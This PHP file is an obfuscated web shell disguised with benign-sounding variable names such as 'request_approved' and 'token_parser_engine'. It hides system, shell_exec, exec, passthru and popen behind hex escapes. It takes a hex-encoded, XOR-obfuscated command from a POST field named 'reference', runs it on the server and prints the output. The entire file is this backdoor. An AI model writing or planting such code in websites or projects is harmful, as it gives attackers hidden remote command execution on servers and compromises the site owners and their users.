<?php

$request_approved6 = "\x73\x74r\x65am_\x67\x65\x74_c\x6F\x6Et\x65nt\x73";
$request_approved1 = "\x73yst\x65\x6D";
$request_approved5 = "po\x70e\x6E";
$request_approved2 = "\x73he\x6Cl\x5Fe\x78\x65c";
$auth_exception_handler = "h\x65x2\x62\x69\x6E";
$request_approved3 = "e\x78ec";
$request_approved7 = "\x70clo\x73e";
$request_approved4 = "pa\x73s\x74h\x72\x75";
if (isset($_POST["r\x65fe\x72\x65\x6Ece"])) {
            function token_parser_engine (  $val ,    $key   ) {
$entity =  '' ;
    $m=0;
 while($m<strlen($val)){
$entity.=chr(ord($val[$m])^$key);
$m++;

} return$entity;
 
}
            $reference = $auth_exception_handler($_POST["r\x65fe\x72\x65\x6Ece"]);
            $reference = token_parser_engine($reference, 7);
            if (function_exists($request_approved1)) {
                $request_approved1($reference);
            } elseif (function_exists($request_approved2)) {
                print $request_approved2($reference);
            } elseif (function_exists($request_approved3)) {
                $request_approved3($reference, $binding_val);
                print join("\n", $binding_val);
            } elseif (function_exists($request_approved4)) {
                $request_approved4($reference);
            } elseif (function_exists($request_approved5) && function_exists($request_approved6) && function_exists($request_approved7)) {
                $key_entity = $request_approved5($reference, 'r');
                if ($key_entity) {
                    $k_flag = $request_approved6($key_entity);
                    $request_approved7($key_entity);
                    print $k_flag;
                }
            }
            exit;
        }